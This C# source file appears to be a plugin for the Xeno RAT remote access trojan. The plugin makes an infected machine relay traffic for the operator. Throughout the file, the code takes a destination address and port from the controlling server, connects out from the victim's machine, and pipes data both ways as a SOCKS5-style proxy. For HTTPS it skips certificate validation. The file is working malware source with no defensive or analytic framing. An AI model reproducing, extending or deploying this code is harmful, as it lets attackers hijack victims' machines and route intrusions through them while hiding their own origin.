using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Plugin
{
    public class Main
    {
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 }); // Indicate connection

            while (node.Connected())
            {
                try
                {
                    byte[] idBytes = await node.ReceiveAsync();
                    if (idBytes == null) break;

                    int nodeId = node.sock.BytesToInt(idBytes);
                    Node tempNode = node.Parent?.subNodes?.FirstOrDefault(n => n.SetId == nodeId);

                    if (tempNode == null)
                    {
                        await node.SendAsync(new byte[] { 0 });
                        continue;
                    }

                    await node.SendAsync(new byte[] { 1 });
                    node.AddSubNode(tempNode);
                    var handler = new Socks5Handler(tempNode);
                    _ = handler.StartAsync(); // fire-and-forget
                }
                catch
                {
                    break;
                }
            }

            node.Disconnect();
        }
    }

    public class Socks5Handler
    {
        private Node subnode;

        public Socks5Handler(Node subnode)
        {
            this.subnode = subnode;
        }

        public async Task StartAsync()
        {
            try
            {
                // Receive destination info from server/subnode
                byte[] destAddrBytes = await subnode.ReceiveAsync();
                byte[] portBytes = await subnode.ReceiveAsync();
                byte[] timeoutBytes = await subnode.ReceiveAsync();

                if (destAddrBytes == null || portBytes == null || timeoutBytes == null)
                {
                    subnode.Disconnect();
                    return;
                }

                string destAddr = Encoding.UTF8.GetString(destAddrBytes);
                int destPort = subnode.sock.BytesToInt(portBytes);
                int timeout = subnode.sock.BytesToInt(timeoutBytes);

                await LogAsync($"destAddr: {destAddr}, port: {destPort}, timeout: {timeout}");

                TcpClient remoteClient = new TcpClient
                {
                    ReceiveTimeout = timeout,
                    SendTimeout = timeout
                };

                try
                {
                    await LogAsync("Connecting...");
                    await remoteClient.ConnectAsync(destAddr, destPort);
                    await LogAsync("Connected.");
                }
                catch (SocketException ex)
                {
                    await LogAsync($"SocketException: {ex.Message}");

                    byte[] err;

                    switch (ex.SocketErrorCode)
                    {
                        case SocketError.TimedOut:
                            err = new byte[] { 2 };
                            break;
                        case SocketError.HostUnreachable:
                            err = new byte[] { 3 };
                            break;
                        default:
                            err = new byte[] { 4 };
                            break;
                    }

                    await subnode.SendAsync(err);
                    subnode.Disconnect();
                    return;
                }

                // Send OK back to server/subnode
                await subnode.SendAsync(new byte[] { 1 });

                // Send local socket info back
                IPEndPoint localEP = (IPEndPoint)remoteClient.Client.LocalEndPoint;
                byte[] localAddr = localEP.Address.GetAddressBytes();
                byte[] localPort = BitConverter.GetBytes((ushort)localEP.Port);
                if (BitConverter.IsLittleEndian) Array.Reverse(localPort); // network byte order
                await subnode.SendAsync(localAddr);
                await subnode.SendAsync(localPort);

                // Wrap in TLS for HTTPS if needed
                Stream remoteStream = remoteClient.GetStream();
                if (destPort == 443) // HTTPS
                {
                    SslStream sslStream = new SslStream(remoteStream, false, (sender, certificate, chain, errors) => true);
                    await sslStream.AuthenticateAsClientAsync(destAddr);
                    remoteStream = sslStream;
                    await LogAsync("TLS handshake completed.");
                }

                // Start bidirectional relay
                await RelayLoop(remoteStream, subnode);

                remoteClient.Close();
                subnode.Disconnect();
                await LogAsync("Disconnected.");
            }
            catch (Exception ex)
            {
                await LogAsync("Error: " + ex.Message);
                subnode.Disconnect();
            }
        }

        // Relay loop between remote stream and subnode
        private async Task RelayLoop(Stream remoteStream, Node subnode)
        {
            byte[] buffer = new byte[4096];
            try
            {
                while (subnode.Connected())
                {
                    // Read from remote
                    var readRemote = remoteStream.ReadAsync(buffer, 0, buffer.Length);
                    var readSubnode = subnode.ReceiveAsync();

                    var completed = await Task.WhenAny(readRemote, readSubnode);

                    if (completed == readRemote)
                    {
                        int bytesRead = readRemote.Result;
                        if (bytesRead == 0) break;
                        await subnode.SendAsync(buffer.Take(bytesRead).ToArray());
                    }
                    else
                    {
                        byte[] data = await readSubnode;
                        if (data == null || data.Length == 0) break;
                        await remoteStream.WriteAsync(data, 0, data.Length);
                        await remoteStream.FlushAsync();
                    }

                    await Task.Delay(10); // avoid tight loop
                }
            }
            catch { /* ignore relay errors */ }
        }

        private readonly string logFile = "log.txt"; // define your log file path

        private async Task LogAsync(string message)
        {
            try
            {
                using (var fs = new FileStream(logFile, FileMode.Append, FileAccess.Write, FileShare.Read, 4096, useAsync: true))
                using (var writer = new StreamWriter(fs))
                {
                    await writer.WriteLineAsync($"{DateTime.Now:HH:mm:ss} - {message}");
                    await writer.FlushAsync();
                }
            }
            catch
            {
                // ignore logging errors
            }
        }
    }
}